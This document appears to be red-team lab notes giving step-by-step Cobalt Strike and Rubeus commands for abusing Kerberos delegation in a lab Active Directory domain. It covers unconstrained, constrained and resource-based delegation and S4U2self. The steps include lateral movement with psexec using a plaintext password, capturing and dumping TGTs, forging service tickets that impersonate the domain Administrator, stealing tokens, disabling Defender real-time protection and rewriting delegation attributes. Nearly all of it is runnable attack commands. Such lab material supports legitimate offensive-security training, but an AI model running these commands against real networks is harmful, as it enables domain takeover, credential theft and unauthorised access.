
### Unconstrained Delegation
- Use LDAP to find computers configured for unconstrained delegation.
    
    BeaconTypeCopy
    
    `ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname`
    
-  Move laterally to _lon-ws-1_.
    
    2.  make_token CONTOSO\rsteel Passw0rd!
    3.  jump psexec64 lon-ws-1 smb

-  Run Rubeus in monitor mode on _lon-ws-1_.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap`
    
-  Wait 1-2 minutes for the TGT of a domain administrator to be captured.
    
-  Stop Rubeus.
    
    1. jobs
    2. jobkill 0

-  Inject the captured TGT into a sacrificial logon session.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:dyork /password:FakePass /ticket:[TICKET]`
    
-  Impersonate the spawned process.
    
    1. steal_token [PID]
-  Verify the ticket is present.
    
    1. run klist
-  Use it to access _lon-dc-1_.
    
    1. ls \\lon-dc-1\c$
-  Drop the impersonation.
    
    1. rev2self
-  Terminate the spawned process.
    
    1. kill [PID]

### Constrained Delegation
- Search for computers whose msDS-AllowedToDelegateTo attribute is not null.
    
    BeaconTypeCopy
    
    `ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo`
    
-  Get the UAC value for _lon-ws-1_ to see if the **TRUSTED_TO_AUTH_FOR_DELEGATION** flag is set.
    
    BeaconTypeCopy
    
    `ldapsearch (&(samAccountType=805306369)(samaccountname=lon-ws-1$)) --attributes userAccountControl`
    
    TerminalTypeCopy
    
    `[Convert]::ToBoolean(16781312 -band 16777216)`
    
-  Move laterally to _lon-ws-1_.
    
    2.  make_token CONTOSO\rsteel Passw0rd!
    3.  jump psexec64 lon-ws-1 smb
-  Dump _lon-ws-1_'s TGT.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap`
    
-  Perform the S4U abuse to obtain a usable service ticket for _cifs/lon-fs-1_, impersonating the default domain admin.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /impersonateuser:Administrator /nowrap`
    
-  Inject the ticket into a sacrificial logon session.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:[CIFS TICKET]`
    
-  Impersonate the process.
    
    1. steal_token [PID]
-  Verify the ticket has been injected.
    
    1. run klist
-  Use the ticket to access _lon-fs-1_.
    
    1. ls \\lon-fs-1\c$

### Service Name Substitution
- Search for computers whose msDS-AllowedToDelegateTo attribute is not null.
    
    BeaconTypeCopy
    
    `ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo`
    
-  Get the UAC value for _lon-ws-1_ to see if the **TRUSTED_TO_AUTH_FOR_DELEGATION** flag is set.
    
    BeaconTypeCopy
    
    `ldapsearch (&(samAccountType=805306369)(samaccountname=lon-ws-1$)) --attributes userAccountControl`
    
-  Move laterally to _lon-ws-1_.
    
    2.  make_token CONTOSO\rsteel Passw0rd!
    3.  jump psexec64 lon-ws-1 smb
-  Dump the TGT for _lon-ws-1_.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap`
    
-  Perform the S4U abuse to obtain a usable service ticket for _time/lon-dc-1_, substituting the service name for _cifs_.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:time/lon-dc-1 /altservice:cifs /ticket:[TGT] /impersonateuser:Administrator /nowrap`
    
-  Inject the ticket into a sacraficial logon session.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:[CIFS TICKET]`
    
-  Impersonate the process.
    
    1. steal_token [PID]
-  Verify the ticket has been injected.
    
    1. run klist
-  Use the ticket to list the C$ share on _lon-dc-1_.
    
    1. ls \\lon-dc-1\c$


### S4Uself 

- Use LDAP to find computers configured with unconstrained delegation.
    
    BeaconTypeCopy
    
    `ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname`
    
-  Move laterally to _lon-ws-1_.
    
    2.  make_token CONTOSO\rsteel Passw0rd!
    3.  jump psexec64 lon-ws-1 smb
-  Run Rubeus in monitor mode on _lon-ws-1_.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap`
    
-  From the medium-integrity Beacon, use a remote authentication trigger to force _lon-dc-1_ to authenticate to _lon-ws-1_.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1`
    
    > You may need to run it a few times.
    
-  Use the TGT to request a usable service ticket for cifs/lon-dc-1, impersonating the default domain administrator.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/lon-dc-1 /ticket:[TGT] /nowrap`
    
    > The **/self** parameter is key here.
    
-  Inject the ticket into a sacraficial logon session.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:[CIFS TICKET]`
    
-  Impersonate the process.
    
    1. steal_token [PID]
-  Verify the ticket was injected.
    
    1. run klist
-  Use the ticket to list the C$ share on _lon-dc-1_.
    
    1. ls \\lon-dc-1\c$

### Resource-Based Constrained Delegation
- Start a SOCKS proxy on the medium-integrity Beacon.
    
    1. socks 1080
-  From the Windows Start Menu, launch Proxifier.
    
-  Go **Profile > Proxy Servers** and add a new proxy server.
    
    1. Address: 10.0.0.5
    2. Port: 1080
    3. Protocol: Version 4
-  Use this proxy by default? -> No.
    
-  Edit Proxification Rules now? -> Yes.
    
-  Add a new proxification rule.
    
    1. Name: Beacon
    2. Applications: Any
    3. Target hosts: 10.10.120.0/23
    4. Target ports: Any
    5. Action: Proxy SOCKS4 10.0.0.5
-  Open a Terminal window as administrator.
    
-  Add a host entry for _lon-dc-1_.
    
    1. Add-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Value '10.10.120.1 lon-dc-1'
-  Disable Defender's real-time protection.
    
    1. Set-MpPreference -DisableRealtimeMonitoring $true
-  Import PowerView.
    
    1. ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
-  Create a new plaintext credential object.
    
    1. $Cred = Get-Credential CONTOSO\rsteel
    
    > The password is Passw0rd!.
    
-  Find principals that have WriteProperty privileges on the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of computers.
    
    powershellTypeCopy
    
    `Get-DomainComputer -Server 'lon-dc-1' -Credential $Cred | Get-DomainObjectAcl -Server 'lon-dc-1' -Credential $Cred | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -eq 'WriteProperty' } | select ObjectDN,SecurityIdentifier`
    
-  Resolve the SID to a domain group.
    
    powershellTypeCopy
    
    `Get-ADGroup -Filter 'objectsid -eq "S-1-5-21-3926355307-1661546229-813047887-1107"' -Server 'lon-dc-1' -Credential $Cred`
    
-  Check for any existing RBCD configurations.
    
    powershellTypeCopy
    
    `Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount`
    
-  Add RBCD between _lon-fs-1_ and _lon-wkstn-1_, making sure not to overwrite the existing entry.
    
    powershellTypeCopy
    
    `$ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 'lon-dc-1' -Credential $Cred $wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 'lon-dc-1' -Credential $Cred Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 'lon-dc-1' -Credential $Cred`
    
-  Verify that _lon-wkstn-1_ was added.
    
    powershellTypeCopy
    
    `Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount`
    
-  In the high-integrity Beacon, obtain a TGT for _lon-wkstn-1_.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap`
    
-  Request a usable service ticket for _cifs/lon-fs-1_, impersonating the default domain administrator.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-wkstn-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /nowrap`
    
-  Inject the ticket into a sacrificial logon session.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:[CIFS TICKET]`
    
-  Impersonate the process.
    
    1. steal_token [PID]
-  Verify the ticket was injected.
    
    1. run klist
-  Use the ticket to list C$ on lon-fs-1.
    
    1. ls \\lon-fs-1\c$
-  On the Atacker Desktop, restore the RBCD configuration back to how it was.
    
    powershellTypeCopy
    
    `Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1 -Server 'lon-dc-1' -Credential $Cred`